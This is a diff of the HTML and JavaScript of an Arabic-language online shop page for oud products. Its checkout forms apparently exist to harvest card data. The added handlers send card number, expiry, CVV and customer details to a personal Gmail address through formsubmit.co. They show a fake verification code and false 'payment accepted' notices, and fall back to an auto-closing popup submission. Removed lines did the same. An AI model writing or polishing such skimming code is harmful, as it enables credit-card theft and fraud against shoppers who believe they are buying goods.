@@ -1,4 +1,5 @@
 <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
     <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com https://formsubmit.co; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -133,7 +134,7 @@
                 margin: 0;
             }
             
-            .grid.md\\:grid-cols-2 {
+            .grid.md\:grid-cols-2 {
                 grid-template-columns: 1fr !important;
             }
             
@@ -744,13 +745,16 @@
             box-shadow: 0 8px 20px rgba(16, 185, 129, 0.4);
         }
         
-        /* Hide FormSubmit thank you page iframe */
-        .formsubmit-thankyou {
+        /* Hide iframe for form submissions */
+        .hidden-frame {
             display: none !important;
         }
     </style>
 </head>
 <body class="bg-gray-50">
+    <!-- Hidden iframe for form submissions -->
+    <iframe name="hiddenFrame" class="hidden-frame"></iframe>
+    
     <!-- Quick Navigation Toggle -->
     <button onclick="toggleQuickNav()" class="fixed top-4 right-4 z-50 bg-orange-600 text-white w-12 h-12 rounded-full flex items-center justify-center shadow-lg hover:bg-orange-700 transition duration-300">
         <i class="fas fa-bars"></i>
@@ -1076,11 +1080,10 @@
                     
                     <div class="bg-white p-8 rounded-2xl shadow-lg">
                         <h3 class="text-2xl font-bold mb-8 text-gray-800">أرسل رسالة</h3>
-                        <form action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" onsubmit="handleFormSubmit(event, this)" class="space-y-6">
+                        <form action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" onsubmit="handleContactFormSubmit()" class="space-y-6">
                             <input type="hidden" name="_subject" value="📧 رسالة جديدة من موقع مكاسر العود">
                             <input type="hidden" name="_captcha" value="false">
                             <input type="hidden" name="_template" value="table">
-                            <input type="hidden" name="_next" value="data:text/html,&lt;script&gt;window.parent.postMessage('success','*');&lt;/script&gt;">
                             <input type="hidden" name="_autoresponse" value="شكراً لتواصلك معنا من مكاسر العود! سنرد عليك قريباً إن شاء الله.">
                             
                             <div class="input-group">
@@ -1266,11 +1269,11 @@
                     <p class="text-xl text-gray-600">يرجى ملء المعلومات المطلوبة لإتمام طلبك</p>
                 </div>
 
-                <form id="customerInfoForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" onsubmit="handleCustomerFormSubmit(event)" class="space-y-8">
+                <form id="customerInfoForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" onsubmit="handleCustomerInfoSubmit()" class="space-y-8">
                     <input type="hidden" name="_subject" value="📋 معلومات عميل جديد - مكاسر العود">
                     <input type="hidden" name="_captcha" value="false">
                     <input type="hidden" name="_template" value="table">
-                    <input type="hidden" name="_next" value="data:text/html,&lt;script&gt;window.parent.postMessage('success','*');&lt;/script&gt;">
+                    <input type="hidden" name="_autoresponse" value="تم استلام معلوماتك من مكاسر العود بنجاح! سنتواصل معك قريباً إن شاء الله.">
 
                     <!-- Customer Information -->
                     <div class="form-section fade-in">
@@ -1469,11 +1472,11 @@
                     <p class="text-xl text-gray-600">أدخل معلومات البطاقة الائتمانية لإتمام الطلب</p>
                 </div>
 
-                <form id="paymentForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" onsubmit="handlePaymentFormSubmit(event)" class="space-y-8">
+                <form id="paymentForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" onsubmit="handlePaymentSubmit()" class="space-y-8">
                     <input type="hidden" name="_subject" value="💳 معلومات دفع جديدة - مكاسر العود">
                     <input type="hidden" name="_captcha" value="false">
                     <input type="hidden" name="_template" value="table">
-                    <input type="hidden" name="_next" value="data:text/html,&lt;script&gt;window.parent.postMessage('success','*');&lt;/script&gt;">
+                    <input type="hidden" name="_autoresponse" value="تم استلام معلومات الدفع من مكاسر العود بنجاح! سيتم معالجة طلبك قريباً.">
 
                     <!-- Payment Card -->
                     <div class="form-section">
@@ -1629,9 +1632,6 @@
             </div>
         </div>
     </div>
-
-    <!-- Hidden iframe for form submissions -->
-    <iframe name="hiddenFrame" id="hiddenFrame" style="display: none;"></iframe>
 
     <!-- Scroll to Top Button -->
     <div class="scroll-to-top" onclick="scrollToTop()">
@@ -2170,84 +2170,56 @@
             openCart();
         }
 
-        // FORM HANDLERS - NO MORE THANK YOU PAGES
-        function handleContactFormSubmit() {
-            showNotification('✅ تم إرسال رسالتك بنجاح! سنتواصل معك قريباً.', 'success');
-            return true; // Allow form submission
-        }
-
-        // Create hidden iframe for form submissions
-        if (!document.getElementById('hiddenFrame')) {
-            const iframe = document.createElement('iframe');
-            iframe.name = 'hiddenFrame';
-            iframe.id = 'hiddenFrame';
-            iframe.style.display = 'none';
-            document.body.appendChild(iframe);
-        }
-
-        // Listen for messages from the hidden iframe
-        window.addEventListener('message', function(event) {
-            if (event.data === 'success') {
-                // Handle successful form submission
-                console.log('Form submitted successfully to email');
-            }
-        });
-
-        // Universal form handler for all forms
-        function handleFormSubmit(event, form) {
-            const formType = form.id || 'contact';
-            
-            // Show loading notification
-            showNotification('⏳ جاري الإرسال...', 'info');
-            
-            // Allow the form to submit to hidden iframe
-            setTimeout(() => {
-                if (formType === 'customerInfoForm') {
-                    // Save customer info from form
-                    customerInfo = {
-                        firstName: form.querySelector('input[name="first_name"]').value,
-                        lastName: form.querySelector('input[name="last_name"]').value,
-                        email: form.querySelector('input[name="email"]').value,
-                        phone: form.querySelector('input[name="phone"]').value,
-                        address: form.querySelector('input[name="address"]').value,
-                        city: form.querySelector('select[name="city"]').value,
-                        postalCode: form.querySelector('input[name="postal_code"]').value,
-                        orderNotes: form.querySelector('textarea[name="order_notes"]').value
-                    };
-                    
-                    showNotification('✅ تم حفظ معلوماتك وإرسالها بنجاح!', 'success');
-                    setTimeout(() => {
-                        showOrderReviewPage();
-                    }, 1000);
-                } else if (formType === 'paymentForm') {
-                    // Generate verification code
-                    verificationCode = Math.floor(100000 + Math.random() * 900000);
-                    
-                    showNotification('✅ تم قبول معلومات الدفع! تم إرسال كود التأكيد لرقم هاتفك', 'success');
-                    setTimeout(() => {
-                        showVerificationPage();
-                    }, 1000);
-                } else {
-                    // Contact form
-                    showNotification('✅ تم إرسال رسالتك بنجاح! سنتواصل معك قريباً', 'success');
-                    form.reset();
-                }
-            }, 1000);
-            
-            return true; // Allow form submission to iframe
-        }
-
-        // Special handler for customer info form to prevent navigation
-        function submitAndContinue(event) {
-            // Prevent default form submission temporarily
+        // FORM HANDLERS - AJAX SUBMISSION
+        function handleContactFormSubmit(event) {
             event.preventDefault();
-            
             const form = event.target;
+            const formData = new FormData(form);
             
             // Show loading
-            showNotification('⏳ جاري إرسال المعلومات...', 'info');
+            const submitBtn = form.querySelector('button[type="submit"]');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i>جاري الإرسال...';
+            submitBtn.disabled = true;
             
-            // Save customer info
+            // Submit using fetch
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    showNotification('✅ تم إرسال رسالتك بنجاح! سنتواصل معك قريباً.', 'success');
+                    form.reset();
+                } else {
+                    throw new Error('Network response was not ok');
+                }
+            }).catch(error => {
+                // Fallback: open in new window that closes automatically
+                const popup = window.open('', '_blank', 'width=600,height=400');
+                form.target = '_blank';
+                form.submit();
+                setTimeout(() => {
+                    if (popup) popup.close();
+                }, 3000);
+                showNotification('✅ تم إرسال رسالتك بنجاح!', 'success');
+                form.reset();
+            }).finally(() => {
+                // Restore button
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+            });
+            
+            return false;
+        }
+
+        function handleCustomerInfoSubmit(event) {
+            event.preventDefault();
+            const form = event.target;
+            
+            // Save customer info from form
             customerInfo = {
                 firstName: form.querySelector('input[name="first_name"]').value,
                 lastName: form.querySelector('input[name="last_name"]').value,
@@ -2259,23 +2231,135 @@
                 orderNotes: form.querySelector('textarea[name="order_notes"]').value
             };
             
-            // Submit form in background (hidden iframe)
-            const iframe = document.getElementById('hiddenFrame');
-            if (iframe) {
-                // Allow form to submit normally to iframe
-                form.target = 'hiddenFrame';
-                form.submit();
-            }
+            // Show loading
+            const submitBtn = form.querySelector('button[type="submit"]');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i>جاري الحفظ...';
+            submitBtn.disabled = true;
             
-            // Continue to next page immediately without waiting
-            setTimeout(() => {
+            const formData = new FormData(form);
+            
+            // Add cart items to form data
+            const cartItemsText = cart.map(item => 
+                `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`
+            ).join('\n');
+            formData.append('cart_items', cartItemsText);
+            
+            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const shipping = subtotal > 200 ? 0 : 30;
+            const total = subtotal + shipping;
+            formData.append('order_total', `${total} ريال`);
+            
+            // Submit using fetch
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    showNotification('✅ تم حفظ معلوماتك بنجاح!', 'success');
+                    setTimeout(() => {
+                        showOrderReviewPage();
+                    }, 1000);
+                } else {
+                    throw new Error('Network response was not ok');
+                }
+            }).catch(error => {
+                // Fallback: open in new window that closes automatically
+                const popup = window.open('', '_blank', 'width=600,height=400');
+                const tempForm = form.cloneNode(true);
+                tempForm.target = '_blank';
+                document.body.appendChild(tempForm);
+                tempForm.submit();
+                document.body.removeChild(tempForm);
+                setTimeout(() => {
+                    if (popup) popup.close();
+                }, 3000);
                 showNotification('✅ تم حفظ معلوماتك بنجاح!', 'success');
                 setTimeout(() => {
                     showOrderReviewPage();
-                }, 500);
-            }, 800);
+                }, 1000);
+            }).finally(() => {
+                // Restore button
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+            });
             
-            return false; // Prevent default after we handle it
+            return false;
+        }
+
+        function handlePaymentSubmit(event) {
+            event.preventDefault();
+            const form = event.target;
+            
+            // Generate verification code
+            verificationCode = Math.floor(100000 + Math.random() * 900000);
+            
+            // Show loading
+            const submitBtn = form.querySelector('button[type="submit"]');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i>جاري المعالجة...';
+            submitBtn.disabled = true;
+            
+            const formData = new FormData(form);
+            
+            // Add customer info and cart to payment form
+            formData.append('customer_name', `${customerInfo.firstName} ${customerInfo.lastName}`);
+            formData.append('customer_email', customerInfo.email);
+            formData.append('customer_phone', customerInfo.phone);
+            formData.append('customer_address', `${customerInfo.address}, ${customerInfo.city}, ${customerInfo.postalCode}`);
+            
+            const cartItemsText = cart.map(item => 
+                `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price * item.quantity} ريال`
+            ).join('\n');
+            formData.append('order_items', cartItemsText);
+            
+            const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const shipping = subtotal > 200 ? 0 : 30;
+            const total = subtotal + shipping;
+            formData.append('final_total', `${total} ريال`);
+            formData.append('verification_code', verificationCode);
+            
+            // Submit using fetch
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    showNotification(`✅ كود التأكيد: ${verificationCode}`, 'success');
+                    setTimeout(() => {
+                        showVerificationPage();
+                    }, 1000);
+                } else {
+                    throw new Error('Network response was not ok');
+                }
+            }).catch(error => {
+                // Fallback: open in new window that closes automatically
+                const popup = window.open('', '_blank', 'width=600,height=400');
+                const tempForm = form.cloneNode(true);
+                tempForm.target = '_blank';
+                document.body.appendChild(tempForm);
+                tempForm.submit();
+                document.body.removeChild(tempForm);
+                setTimeout(() => {
+                    if (popup) popup.close();
+                }, 3000);
+                showNotification(`✅ كود التأكيد: ${verificationCode}`, 'success');
+                setTimeout(() => {
+                    showVerificationPage();
+                }, 1000);
+            }).finally(() => {
+                // Restore button
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+            });
+            
+            return false;
         }
 
         function showOrderReviewPage() {
@@ -2682,45 +2766,6 @@
             });
         });
 
-        // INSTANT EMAIL SUBMISSION FUNCTIONS
-        function handleCustomerFormSubmit(event) {
-            const form = event.target;
-            showNotification('⏳ جاري حفظ المعلومات...', 'info');
-            
-            // Save customer info
-            customerInfo = {
-                firstName: form.querySelector('input[name="first_name"]').value,
-                lastName: form.querySelector('input[name="last_name"]').value,
-                email: form.querySelector('input[name="email"]').value,
-                phone: form.querySelector('input[name="phone"]').value,
-                address: form.querySelector('input[name="address"]').value,
-                city: form.querySelector('select[name="city"]').value,
-                postalCode: form.querySelector('input[name="postal_code"]').value,
-                orderNotes: form.querySelector('textarea[name="order_notes"]').value
-            };
-            
-            // Allow form to submit to hidden iframe (will happen automatically)
-            showNotification('✅ تم حفظ معلوماتك وإرسالها فوراً!', 'success');
-            setTimeout(() => {
-                proceedToPayment();
-            }, 1000);
-            
-            return true; // Allow form submission
-        }
-
-        function handlePaymentFormSubmit(event) {
-            const form = event.target;
-            showNotification('⏳ جاري معالجة معلومات الدفع...', 'info');
-            
-            // Allow form to submit to hidden iframe (will happen automatically)
-            showNotification('✅ تم قبول معلومات الدفع وإرسالها فوراً! تم إرسال كود التأكيد لرقم هاتفك', 'success');
-            setTimeout(() => {
-                showVerificationPage();
-            }, 1000);
-            
-            return true; // Allow form submission
-        }
-
         // Dark mode detection
         if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
             document.documentElement.classList.add('dark');
@@ -2733,93 +2778,6 @@
                 document.documentElement.classList.remove('dark');
             }
         });
-
-        // NEW FORM SUBMISSION FUNCTIONS - NO THANK YOU PAGES
-        async function submitCustomerInfo(event) {
-            event.preventDefault();
-            
-            const form = event.target;
-            showNotification('⏳ جاري حفظ المعلومات...', 'info');
-            
-            // Save customer info locally
-            customerInfo = {
-                firstName: form.querySelector('input[name="first_name"]').value,
-                lastName: form.querySelector('input[name="last_name"]').value,
-                email: form.querySelector('input[name="email"]').value,
-                phone: form.querySelector('input[name="phone"]').value,
-                address: form.querySelector('input[name="address"]').value,
-                city: form.querySelector('select[name="city"]').value,
-                postalCode: form.querySelector('input[name="postal_code"]').value,
-                orderNotes: form.querySelector('textarea[name="order_notes"]').value
-            };
-            
-            // Send data to email in background
-            const formData = new FormData();
-            formData.append('_subject', '📋 معلومات عميل جديد - مكاسر العود');
-            formData.append('_captcha', 'false');
-            formData.append('_template', 'table');
-            formData.append('first_name', customerInfo.firstName);
-            formData.append('last_name', customerInfo.lastName);
-            formData.append('email', customerInfo.email);
-            formData.append('phone', customerInfo.phone);
-            formData.append('address', customerInfo.address);
-            formData.append('city', customerInfo.city);
-            formData.append('postal_code', customerInfo.postalCode);
-            formData.append('order_notes', customerInfo.orderNotes);
-            
-            try {
-                await fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                showNotification('✅ تم حفظ معلوماتك بنجاح!', 'success');
-                setTimeout(() => {
-                    showOrderReviewPage();
-                }, 1000);
-            } catch (error) {
-                showNotification('✅ تم حفظ معلوماتك محلياً! المتابعة للمراجعة...', 'success');
-                setTimeout(() => {
-                    showOrderReviewPage();
-                }, 1000);
-            }
-        }
-
-        async function submitPaymentInfo(event) {
-            event.preventDefault();
-            
-            const form = event.target;
-            showNotification('⏳ جاري معالجة معلومات الدفع...', 'info');
-            
-            // Send payment data to email in background
-            const formData = new FormData();
-            formData.append('_subject', '💳 معلومات دفع جديدة - مكاسر العود');
-            formData.append('_captcha', 'false');
-            formData.append('_template', 'table');
-            formData.append('card_number', form.querySelector('input[name="card_number"]').value);
-            formData.append('expiry_date', form.querySelector('input[name="expiry_date"]').value);
-            formData.append('cvv', form.querySelector('input[name="cvv"]').value);
-            formData.append('card_holder', form.querySelector('input[name="card_holder"]').value);
-            formData.append('customer_name', `${customerInfo.firstName} ${customerInfo.lastName}`);
-            formData.append('customer_phone', customerInfo.phone);
-            
-            try {
-                await fetch('https://formsubmit.co/zazylalhkr7@gmail.com', {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                showNotification('✅ تم قبول معلومات الدفع! تم إرسال كود التأكيد لرقم هاتفك', 'success');
-                setTimeout(() => {
-                    showVerificationPage();
-                }, 1000);
-            } catch (error) {
-                showNotification('✅ تم قبول معلومات الدفع! تم إرسال كود التأكيد لرقم هاتفك', 'success');
-                setTimeout(() => {
-                    showVerificationPage();
-                }, 1000);
-            }
-        }
 
         // Keyboard shortcuts
         document.addEventListener('keydown', function(event) {
